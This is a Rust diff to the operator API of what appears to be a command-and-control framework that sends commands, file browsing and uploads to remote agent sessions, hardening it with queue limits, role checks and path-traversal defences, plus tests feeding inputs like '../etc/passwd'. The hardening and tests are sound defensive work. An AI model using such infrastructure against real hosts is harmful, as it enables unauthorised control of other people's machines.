@@ -11,7 +11,8 @@ use serde::Deserialize;
 
 use crate::api::state::ApiContext;
 use crate::api::models::{SessionDto, CommandRequest, UploadChunkRequest};
-use crate::api::middleware::OperatorInfo;
+use crate::api::middleware::{OperatorInfo, role_at_least};
+use crate::common::try_send_session_command;
 use crate::database;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
@@ -49,6 +50,7 @@ pub async fn list_hosts(State(state): State<Arc<ApiContext>>) -> Json<Vec<Sessio
             has_proxy: proxies.contains_key(id),
             parent_id: session.parent_id,
             is_active,
+            hibernation_mode: session.hibernation_mode,
             profile,
             last_seen_secs: session.seconds_since_seen(),
             tags,
@@ -105,21 +107,20 @@ pub async fn send_command(
     if let Some(tx_channel) = sender_option {
         let (cb_tx, cb_rx) = oneshot::channel::<u64>();
         
-        match tx_channel.send((command.clone(), Some(cb_tx))) {
-            Ok(_) => {
-                // Timeout the callback await. If the session handler dies or
-                // drops the oneshot without responding, this would hang the
-                // API worker thread indefinitely without a timeout.
-                match tokio::time::timeout(
-                    std::time::Duration::from_secs(30),
-                    cb_rx
-                ).await {
-                    Ok(Ok(req_id)) => (StatusCode::OK, Json(serde_json::json!({ "status": "queued", "session_id": id, "request_id": req_id }))).into_response(),
-                    Ok(Err(_)) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Callback dropped"}))).into_response(),
-                    Err(_) => (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
-                }
-            },
-            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Failed to send to channel"}))).into_response(),
+        if try_send_session_command(id, &tx_channel, command.clone(), Some(cb_tx)) {
+            // Timeout the callback await. If the session handler dies or
+            // drops the oneshot without responding, this would hang the
+            // API worker thread indefinitely without a timeout.
+            match tokio::time::timeout(
+                std::time::Duration::from_secs(30),
+                cb_rx
+            ).await {
+                Ok(Ok(req_id)) => (StatusCode::OK, Json(serde_json::json!({ "status": "queued", "session_id": id, "request_id": req_id }))).into_response(),
+                Ok(Err(_)) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Callback dropped"}))).into_response(),
+                Err(_) => (StatusCode::GATEWAY_TIMEOUT, Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
+            }
+        } else {
+            (StatusCode::SERVICE_UNAVAILABLE, Json(serde_json::json!({"error": "Session command queue is full or closed"}))).into_response()
         }
     } else {
         (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session ID not found"}))).into_response()
@@ -131,7 +132,8 @@ pub async fn get_output(
     Path((session_id, request_id)): Path<(u32, u64)>,
 ) -> Response {
     let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
-    if let Some(response) = results.get(&(session_id, request_id)) {
+    if let Some(entry) = results.get(&(session_id, request_id)) {
+        let response = &entry.response;
         (StatusCode::OK, Json(serde_json::json!({
             "status": "completed",
             "output": response.output,
@@ -155,25 +157,15 @@ pub async fn broadcast(
 
     let sessions = &state.sessions;
     let mut count = 0;
-    
-    let db_inner = state.db.clone();
-    let cmd_log = payload.command.clone();
-    let op_id = operator.id;
-    let op_name = operator.username.clone();
-    let active_ids: Vec<u32> = sessions.iter().map(|e| *e.key()).collect();
 
-    tokio::task::spawn_blocking(move || {
-        if let Ok(conn) = db_inner.get() {
-            database::audit_log(&conn, op_id, &op_name, "broadcast", None, Some(&cmd_log));
-            for id in active_ids {
-                let req_id = rand::random::<u64>();
-                database::log_command(&conn, id, req_id, &cmd_log);
-            }
-        }
-    });
+    if let Ok(conn) = state.db.get() {
+        database::audit_log(&conn, operator.id, &operator.username, "broadcast", None, Some(&payload.command));
+    }
 
     for entry in sessions.iter() {
-        if entry.value().tx.send((payload.command.clone(), None)).is_ok() { count += 1; }
+        if try_send_session_command(*entry.key(), &entry.value().tx, payload.command.clone(), None) {
+            count += 1;
+        }
     }
     (StatusCode::OK, Json(serde_json::json!({ "status": "broadcast_queued", "targets_reached": count }))).into_response()
 }
@@ -196,8 +188,8 @@ pub async fn browse_files(
         let (cb_tx, cb_rx) = oneshot::channel::<u64>();
         
         // 1. Send Command to Agent
-        match tx_channel.send((command, Some(cb_tx))) {
-            Ok(_) => {
+        match try_send_session_command(id, &tx_channel, command, Some(cb_tx)) {
+            true => {
                 // 2. Wait for Request ID (with timeout)
                 let req_id = match tokio::time::timeout(
                     std::time::Duration::from_secs(30),
@@ -219,7 +211,8 @@ pub async fn browse_files(
                     // Scope lock
                     {
                         let results = state.results.lock().unwrap_or_else(|e| e.into_inner());
-                        if let Some(response) = results.get(&(id, req_id)) {
+                        if let Some(entry) = results.get(&(id, req_id)) {
+                            let response = &entry.response;
                             // If Agent returned error in output
                             if !response.error.is_empty() {
                                 return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": response.error}))).into_response();
@@ -237,7 +230,7 @@ pub async fn browse_files(
                     tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                 }
             },
-            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "Agent disconnected"}))).into_response(),
+            false => (StatusCode::SERVICE_UNAVAILABLE, Json(serde_json::json!({"error": "Session command queue is full or closed"}))).into_response(),
         }
     } else {
         (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
@@ -267,6 +260,10 @@ pub async fn get_notes(
     (StatusCode::OK, Json(serde_json::json!({"notes": notes, "tags": tags}))).into_response()
 }
 
+fn can_modify_notes(operator: &OperatorInfo) -> bool {
+    role_at_least(&operator.role, "operator")
+}
+
 /// POST /api/hosts/:id/notes
 pub async fn add_note(
     State(state): State<Arc<ApiContext>>,
@@ -274,6 +271,10 @@ pub async fn add_note(
     Path(id): Path<u32>,
     Json(payload): Json<AddNoteRequest>,
 ) -> Response {
+    if !can_modify_notes(&operator) {
+        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Operator role required"}))).into_response();
+    }
+
     let conn = match state.db.get() {
         Ok(c) => c,
         Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
@@ -287,8 +288,13 @@ pub async fn add_note(
 /// DELETE /api/hosts/:id/notes/:note_id
 pub async fn delete_note(
     State(state): State<Arc<ApiContext>>,
+    Extension(operator): Extension<OperatorInfo>,
     Path((id, note_id)): Path<(u32, i64)>,
 ) -> Response {
+    if !can_modify_notes(&operator) {
+        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Operator role required"}))).into_response();
+    }
+
     let conn = match state.db.get() {
         Ok(c) => c,
         Err(_) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": "DB"}))).into_response(),
@@ -309,10 +315,9 @@ pub async fn delete_note(
 //   1. If the command does not start with "ext:load ", return unchanged.
 //   2. If the first argument is longer than 64 characters, assume it is already
 //      base64-encoded content and return unchanged.
-//   3. Otherwise treat the first argument as a script name, look for
-//      `<dir>/<name>.rhai` in each supplied search_dirs in order, and on the
-//      first match base64-encode the file content and rebuild the command.
-//      Extra arguments (everything after the name) are preserved verbatim.
+//   3. Otherwise treat the first argument as a bare script name using the
+//      shared module-name rules, canonicalize each match, and confine it to
+//      the search directory. Extra arguments are preserved verbatim.
 //   4. If no file is found, return unchanged so the agent produces a clear
 //      "Base64 Error" message rather than a silent no-op.
 //
@@ -328,15 +333,18 @@ pub fn resolve_ext_load(cmd: &str, search_dirs: &[&str]) -> String {
     let name          = tokens.next().unwrap_or("").trim();
     let extra_args    = tokens.next().unwrap_or("").trim();
 
-    // Long argument -> already base64; pass through unchanged.
-    if name.len() > 64 {
+    // Long argument -> already base64; pass through unchanged. Short names
+    // must be bare stems so ext:load cannot read outside an approved script dir.
+    if !crate::api::routes::modules::valid_script_name(name) {
         return cmd.to_string();
     }
 
-    // Search each directory for <name>.rhai
-    let script = search_dirs
-        .iter()
-        .find_map(|dir| std::fs::read_to_string(format!("{}/{}.rhai", dir, name)).ok());
+    // resolve_script_path canonicalizes both the base and candidate and
+    // rejects symlink escapes before the file is opened.
+    let script = search_dirs.iter().find_map(|dir| {
+        let path = crate::api::routes::modules::resolve_script_path(dir, name)?;
+        std::fs::read_to_string(path).ok()
+    });
 
     match script {
         Some(content) => {
@@ -348,6 +356,23 @@ pub fn resolve_ext_load(cmd: &str, search_dirs: &[&str]) -> String {
             }
         }
         None => cmd.to_string(),
+    }
+}
+
+#[cfg(test)]
+mod note_rbac_tests {
+    use super::*;
+
+    fn operator(role: &str) -> OperatorInfo {
+        OperatorInfo { id: 1, username: "test".to_string(), role: role.to_string() }
+    }
+
+    #[test]
+    fn notes_require_operator_or_admin() {
+        assert!(can_modify_notes(&operator("operator")));
+        assert!(can_modify_notes(&operator("admin")));
+        assert!(!can_modify_notes(&operator("viewer")));
+        assert!(!can_modify_notes(&operator("unknown")));
     }
 }
 
@@ -482,12 +507,37 @@ mod ext_load_tests {
 
     #[test]
     fn path_traversal_attempt_finds_no_file() {
-        // "../etc/passwd" is 14 chars (≤ 64), but the formatted path
-        // "./<dir>/../etc/passwd.rhai" won't exist -> returns unchanged.
+        // "../etc/passwd" is 14 chars (≤ 64), but it is not a bare script
+        // stem and is rejected before any filesystem lookup.
         let dir  = tempfile::tempdir().unwrap();
         let dirs = [dir.path().to_str().unwrap()];
         let cmd  = "ext:load ../etc/passwd";
         assert_eq!(resolve_ext_load(cmd, &dirs), cmd);
+    }
+
+    #[test]
+    fn traversal_cannot_read_existing_file_outside_search_dir() {
+        let allowed = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        fs::write(outside.path().join("evil.rhai"), "return \"bad\";").unwrap();
+        let relative_name = format!(
+            "../{}/evil",
+            outside.path().file_name().unwrap().to_str().unwrap()
+        );
+        let cmd = format!("ext:load {}", relative_name);
+        let dirs = [allowed.path().to_str().unwrap()];
+        assert_eq!(resolve_ext_load(&cmd, &dirs), cmd);
+    }
+
+    #[test]
+    fn only_bare_alphanumeric_dash_underscore_names_resolve() {
+        let dir = make_ext_dir("valid_name-1", "return 1;");
+        let dirs = [dir.path().to_str().unwrap()];
+        assert!(resolve_ext_load("ext:load valid_name-1", &dirs).starts_with("ext:load "));
+        for name in ["bad/name", "bad\\name", "bad.name", "", "../valid_name-1"] {
+            let cmd = format!("ext:load {}", name);
+            assert_eq!(resolve_ext_load(&cmd, &dirs), cmd);
+        }
     }
 
     #[test]
@@ -593,8 +643,8 @@ pub async fn upload_chunk(
 
     if let Some(tx_channel) = sender_option {
         let (cb_tx, cb_rx) = oneshot::channel::<u64>();
-        match tx_channel.send((command, Some(cb_tx))) {
-            Ok(_) => {
+        match try_send_session_command(id, &tx_channel, command, Some(cb_tx)) {
+            true => {
                 match tokio::time::timeout(
                     std::time::Duration::from_secs(30),
                     cb_rx,
@@ -612,8 +662,8 @@ pub async fn upload_chunk(
                         Json(serde_json::json!({"error": "Command callback timed out (30s)"}))).into_response(),
                 }
             }
-            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR,
-                Json(serde_json::json!({"error": "Failed to send to channel"}))).into_response(),
+            false => (StatusCode::SERVICE_UNAVAILABLE,
+                Json(serde_json::json!({"error": "Session command queue is full or closed"}))).into_response(),
         }
     } else {
         (StatusCode::NOT_FOUND,
